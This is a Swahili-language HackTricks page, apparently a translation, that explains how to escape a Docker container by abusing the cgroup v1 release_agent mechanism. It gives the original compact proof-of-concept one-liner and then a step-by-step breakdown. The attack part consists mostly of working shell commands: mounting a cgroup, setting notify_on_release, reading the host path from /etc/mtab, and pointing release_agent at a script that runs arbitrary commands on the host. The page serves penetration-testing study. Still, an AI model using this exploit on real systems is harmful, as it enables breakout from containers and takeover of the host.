# Kutoroka kwa Docker release_agent cgroups

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


**Kwa maelezo zaidi, tazama [chapisho la blogi asili](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Hii ni muhtasari tu:

PoC Asili:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Uthibitisho wa dhana (PoC) unaonyesha njia ya kutumia cgroups kwa kujenga faili ya `release_agent` na kusababisha wito wake kutekeleza amri za aina yoyote kwenye mwenyeji wa kontena. Hapa kuna maelezo ya hatua zinazohusika:

1. **Andaa Mazingira:**
- Inajengwa saraka `/tmp/cgrp` kama sehemu ya kufunga cgroup.
- Kudhibitiwa kwa cgroup ya RDMA kwenye saraka hii. Ikiwa kudhibitiwa kwa RDMA hakupo, inashauriwa kutumia kudhibitiwa kwa cgroup ya `memory` kama mbadala.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Sanidi Kikundi cha Mtoto:**
- Kikundi cha mtoto kinachoitwa "x" kinatengenezwa ndani ya saraka iliyosanidiwa ya kikundi.
- Arifa zinaidhinishwa kwa kikundi cha "x" kwa kuandika 1 kwenye faili yake ya notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Sanidi Wakala wa Kutolewa:**
- Njia ya chombo kwenye mwenyeji inapatikana kutoka faili ya /etc/mtab.
- Faili ya release_agent ya cgroup inasanidiwa kutekeleza hati iliyoitwa /cmd iliyoko kwenye njia ya mwenyeji iliyopatikana.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Unda na Sanidi Skripti ya /cmd:**
- Skripti ya /cmd inaundwa ndani ya kontena na inasanidiwa kutekeleza ps aux, ikielekeza matokeo kwenye faili iliyoitwa /output ndani ya kontena. Njia kamili ya /output kwenye mwenyeji inatajwa.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Kuzindua Shambulio:**
- Mchakato unaanzishwa ndani ya kikundi cha watoto "x" na mara moja unakomeshwa.
- Hii inazindua `release_agent` (script ya /cmd), ambayo inatekeleza ps aux kwenye mwenyeji na kuandika matokeo kwenye /output ndani ya kontena.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
